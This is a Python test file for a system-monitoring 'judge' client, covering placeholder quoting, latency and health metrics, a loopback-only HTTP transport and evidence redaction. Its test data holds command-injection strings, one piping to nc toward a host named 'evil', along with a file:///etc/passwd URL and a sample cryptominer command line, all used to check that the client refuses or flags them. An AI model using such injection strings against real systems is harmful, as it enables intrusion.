@pytest.mark.parametrize("name", ["a b|cat", "a\nid", "x'|nc evil 1|'", 'a"b'])
async def test_a_template_quoting_the_placeholder_cannot_be_broken_out_of(name,
                                                                          monkeypatch) -> None:
    # `grep -F 'pid={entity},'`: shlex.quote inside the template's own quotes closes them.
    judge, out = await attest_quoted(monkeypatch, "process:" + name)
    assert by_question(out)["quoted"].next_step == ""
    assert judge.health().refused_steps >= 1


async def test_a_safe_name_inside_a_quoted_placeholder_is_kept(monkeypatch) -> None:
    judge, out = await attest_quoted(monkeypatch, "process:4242")
    assert by_question(out)["quoted"].next_step.endswith("grep -F 'pid=4242,'")
    assert judge.health().refused_steps == 0


@pytest.mark.parametrize("kind, entity, bare", [
    ("unit", "unit:getty@tty1.service", "getty@tty1.service"),
    ("log_burst", "log:openvpn", "openvpn"),
    ("listener", "listener:tcp/6379", "tcp/6379"),
])
async def test_a_safe_name_is_left_bare_by_the_quoting(kind, entity, bare) -> None:
    judge, out = await attest_loudly(kind, entity)
    steps = templates(kind)
    filled = [a for a in out if "{entity}" in steps[a.question]]
    assert filled
    for a in filled:
        assert a.next_step == steps[a.question].replace("{entity}", bare)  # no quotes added
    assert judge.health().refused_steps == 0


async def test_latency_is_per_request() -> None:
    clock = [0.0]

    async def post(body: dict[str, Any]) -> dict[str, Any]:
        clock[0] += 0.25 if "zombie_buildup" in body["questions"] else 1.5
        return await Fake()(body)

    judge = Judge(post, config(concurrency=1, max_questions_per_request=7),
                  clock=lambda: clock[0])
    out = await judge.attest([context()])
    latencies = {a.question: a.latency_ms for a in out}
    assert latencies["zombie_buildup"] == 250
    assert latencies[PROCESSES[-1].id] == 1500


# --- health --------------------------------------------------------------------------------------


def test_health_before_anything_is_asked_is_unknown() -> None:
    assert Judge(Fake(), config()).health() == JudgeHealth(
        reachable=None, last_error="", p50_ms=None, p95_ms=None, in_flight=0, requests=0,
        refused_answers=0, failed_requests=0, refused_steps=0, name="Judge", model="judge",
        url="http://127.0.0.1:8200/v1/systemone")


async def test_each_attestation_and_the_health_name_the_configured_judge() -> None:
    judge = Judge(Fake(), config(name="Local judge (GPU 0)", model="judge-v2"))
    out = await judge.attest([context()])
    assert out and {a.judge for a in out} == {"Local judge (GPU 0)"}
    health = judge.health()
    assert (health.name, health.model) == ("Local judge (GPU 0)", "judge-v2")


async def test_health_percentiles_over_a_rolling_window() -> None:
    clock = [0.0]
    step = iter(range(1, 10_000))

    async def post(body: dict[str, Any]) -> dict[str, Any]:
        clock[0] += next(step) / 1000  # 1 ms, 2 ms, 3 ms ...
        return await Fake()(body)

    judge = Judge(post, config(concurrency=1, max_questions_per_request=1),
                  clock=lambda: clock[0])
    await judge.attest([context()])
    health = judge.health()
    assert health.requests == len(PROCESSES) == 10
    assert health.p50_ms == pytest.approx(5) and health.p95_ms == pytest.approx(10)
    assert health.reachable is True and health.last_error == ""
    for _ in range(30):  # 300 more requests; the window keeps only the latest
        await judge.attest([context()])
    health = judge.health()
    assert health.requests == 10 * 31
    window = judge_module.WINDOW
    latest = list(range(10 * 31 - window + 1, 10 * 31 + 1))
    assert health.p50_ms == pytest.approx(latest[math.ceil(0.5 * window) - 1])
    assert health.p95_ms == pytest.approx(latest[math.ceil(0.95 * window) - 1])


async def test_reachable_recovers_after_a_success_and_the_last_error_is_kept() -> None:
    fail = [True]

    async def post(body: dict[str, Any]) -> dict[str, Any]:
        if fail[0]:
            raise TransportError("refused")
        return await Fake()(body)

    judge = Judge(post, config())
    await judge.attest([context()])
    assert judge.health().reachable is False
    fail[0] = False
    await judge.attest([context()])
    assert judge.health().reachable is True
    assert "refused" in judge.health().last_error


# --- the real client, against a loopback server --------------------------------------------------


class Server:
    """A loopback HTTP server answering each POST with `reply(path, body) -> (status, bytes)`."""

    def __init__(self, reply: Callable[[str, bytes], tuple[int, bytes, dict[str, str]]]) -> None:
        self.seen: list[tuple[str, dict[str, str], bytes]] = []
        server = self

        class Handler(BaseHTTPRequestHandler):
            def do_POST(self) -> None:
                data = self.rfile.read(int(self.headers["Content-Length"]))
                server.seen.append((self.path, dict(self.headers), data))
                status, payload, headers = reply(self.path, data)
                self.send_response(status)
                for key, value in headers.items():
                    self.send_header(key, value)
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

            def log_message(self, *args: Any) -> None:
                pass

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.httpd.server_address[1]}/v1/systemone"
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()

    def close(self) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


@pytest.fixture
def serve():
    servers: list[Server] = []

    def start(reply):
        servers.append(Server(reply))
        return servers[-1]

    yield start
    for server in servers:
        server.close()


async def test_the_real_client_posts_json_and_returns_the_reply(serve) -> None:
    server = serve(lambda path, data: (200, b'{"answers": {}, "usage": {}}', {}))
    post = urllib_transport(server.url, 5.0)
    body = {"model": "judge", "state": {"a": "é"}, "questions": {"b": {}, "a": {}}}
    assert await post(body) == {"answers": {}, "usage": {}}
    path, headers, data = server.seen[0]
    assert path == "/v1/systemone"
    assert headers["Content-Type"] == "application/json"
    assert json.loads(data) == body
    assert list(json.loads(data)["questions"]) == ["b", "a"]  # order kept: reversal rides on it


async def test_a_key_goes_as_a_bearer_token_and_none_sends_no_authorization(serve) -> None:
    server = serve(lambda path, data: (200, b'{"answers": {}}', {}))
    await urllib_transport(server.url, 5.0, "local-key")({})
    await urllib_transport(server.url, 5.0)({})
    assert server.seen[0][1]["Authorization"] == "Bearer local-key"
    assert "Authorization" not in server.seen[1][1]


@pytest.mark.parametrize("status, payload, headers", [
    (500, b'{"error": "boom"}', {}),
    (200, b"not json", {}),
    (200, b'{"answers": NaN}', {}),
    (200, b'["a list"]', {}),
    (307, b"", {"Location": "http://127.0.0.1:1/elsewhere"}),
], ids=["http-500", "not-json", "nan", "not-object", "redirect"])
async def test_the_real_client_refuses_what_is_not_a_reply(serve, status, payload, headers) -> None:
    server = serve(lambda path, data: (status, payload, headers))
    with pytest.raises(TransportError):
        await urllib_transport(server.url, 5.0)({"model": "judge"})


async def test_the_real_client_refuses_an_oversized_reply(serve, monkeypatch) -> None:
    server = serve(lambda path, data: (200, b'{"answers": {}, "usage": {"x": 12345}}', {}))
    monkeypatch.setattr(judge_module, "MAX_REPLY_BYTES", 16)
    with pytest.raises(TransportError, match="over 16 bytes"):
        await urllib_transport(server.url, 5.0)({})


async def test_the_real_client_ignores_proxy_settings(serve, monkeypatch) -> None:
    server = serve(lambda path, data: (200, b'{"answers": {}}', {}))
    monkeypatch.setenv("http_proxy", "http://10.255.255.1:3128")
    monkeypatch.setenv("HTTP_PROXY", "http://10.255.255.1:3128")
    monkeypatch.delenv("no_proxy", raising=False)
    monkeypatch.delenv("NO_PROXY", raising=False)
    assert await urllib_transport(server.url, 5.0)({}) == {"answers": {}}


async def test_the_real_client_reports_a_refused_connection() -> None:
    post = urllib_transport("http://127.0.0.1:9/v1/systemone", 2.0)
    with pytest.raises(TransportError):
        await post({})


@pytest.mark.parametrize("url", [
    "http://10.0.0.5:8200/v1/systemone", "http://example.com/v1/systemone",
    "https://127.0.0.1:8200/v1/systemone", "file:///etc/passwd", "http:///v1/systemone",
    "http://user:pw@127.0.0.1:8200/v1/systemone",
])
def test_the_real_client_refuses_anything_but_loopback_http(url) -> None:
    with pytest.raises(ValueError):
        urllib_transport(url, 5.0)


@pytest.mark.parametrize("url", ["http://127.0.0.1:8200/v1/systemone",
                                 "http://localhost:8200/v1/systemone", "http://[::1]:8200/x",
                                 "http://127.3.4.5/x"])
def test_the_real_client_accepts_loopback(url) -> None:
    assert callable(urllib_transport(url, 5.0))


# --- the live seam -------------------------------------------------------------------------------


async def test_live_judge_answers_a_processes_snapshot_with_typed_validated_answers() -> None:
    if not os.environ.get("NEONWATCH_LIVE_JUDGE"):
        pytest.skip("live seam: set NEONWATCH_LIVE_JUDGE=1 to ask the real judge at "
                    f"{JudgeServer().url}")
    cfg = Config()
    state = {
        "probe": "proc.top",
        "cores": 16,
        "load": {"1m": 15.8, "5m": 14.9, "15m": 9.2},
        "top_cpu": [
            {"pid": 48211, "user": "alice", "cpu_pct": 1570.0, "rss_mb": 2300,
             "exe": "/tmp/.x/kworkerds", "cmd": "/tmp/.x/kworkerds -o pool.minexmr.com:4444",
             "started": "3 min ago", "state": "R"},
            {"pid": 2101, "user": "alice", "cpu_pct": 3.1, "rss_mb": 900,
             "exe": "/usr/bin/cinnamon", "cmd": "cinnamon --replace", "state": "S"},
            {"pid": 1, "user": "root", "cpu_pct": 0.0, "rss_mb": 12,
             "exe": "/usr/lib/systemd/systemd", "cmd": "/sbin/init splash", "state": "S"},
        ],
        "zombies": 0, "d_state": 0,
    }
    judge = Judge(urllib_transport(cfg.judge.url, cfg.judge.timeout_s), cfg)
    out = await judge.attest([context("processes", state, id="live-1")])
    health = judge.health()
    print(f"\nlive: {len(out)} attestations, {health}")
    for a in out:
        print(f"  {a.question:18} {a.severity.value:8} stable={a.stable!s:5} "
              f"conf={a.confidence:.2f} {a.latency_ms}ms {json.dumps(a.answer)[:90]}")
    assert health.failed_requests == 0 and health.reachable is True
    assert health.refused_answers == 0
    assert {a.question for a in out} == {q.id for q in PROCESSES}
    assert all(isinstance(a, Attestation) and isinstance(a.severity, Severity) for a in out)
    worst = max(a.severity.rank for a in out)
    assert worst >= Severity.WARN.rank, "a miner in /tmp at 1570% CPU should raise something"


# --- evidence ------------------------------------------------------------------------------------


async def test_each_attestation_keeps_the_redacted_evidence_its_question_needs() -> None:
    row = {"pid": 7, "comm": "x", "cpu_pct": 90.0,
           "args": "/usr/bin/x --token=ghp_abcdefghijklmnopqrstuvwx"}
    state = {"processes": {"zombies": 0, "uninterruptible": 0, "top_cpu": [row]}}
    def loud(id: str, wire: dict[str, Any], body: dict[str, Any]) -> dict[str, Any]:
        if wire["type"] == "noul":
            return correct(wire, 0.95)
        return correct(wire, "act_now" if "act_now" in wire["criteria"] else None)

    quiet = await Judge(Fake(), config()).attest([context(state=state)])
    assert all(a.evidence == {} for a in quiet)   # a quiet answer keeps no evidence
    out = {a.question: a for a in await Judge(Fake(loud), config()).attest([context(state=state)])}
    hog = out["background_hog"].evidence
    assert list(hog) == ["processes/top_cpu"]
    assert "ghp_" not in judge_module.dumps(hog) and "[REDACTED]" in judge_module.dumps(hog)
    assert out["zombie_buildup"].evidence == {"processes/zombies": 0}
    # A question that weighs the whole state keeps it when it is small.
    assert out["action"].evidence["processes"]["zombies"] == 0


def test_evidence_too_large_is_cut_or_left_out() -> None:
    meaning = Meaning(thresholds=((0.5, Outcome(Severity.WATCH, "c", "")),))
    needs = Question("q", AnswerKind.NOUL, "?", (), (), meaning, False, needs=("big",))
    whole = Question("w", AnswerKind.NOUL, "?", (), (), meaning, False)
    big = {"big": "x" * (judge_module.EVIDENCE_CHARS * 2)}
    cut = judge_module.evidence(needs, big)
    assert len(cut["truncated"]) == judge_module.EVIDENCE_CHARS
    assert cut["chars"] > len(cut["truncated"])
    assert judge_module.evidence(whole, big) == {"omitted_chars": len(judge_module.dumps(big))}
    assert judge_module.evidence(whole, "a cut string") == {}
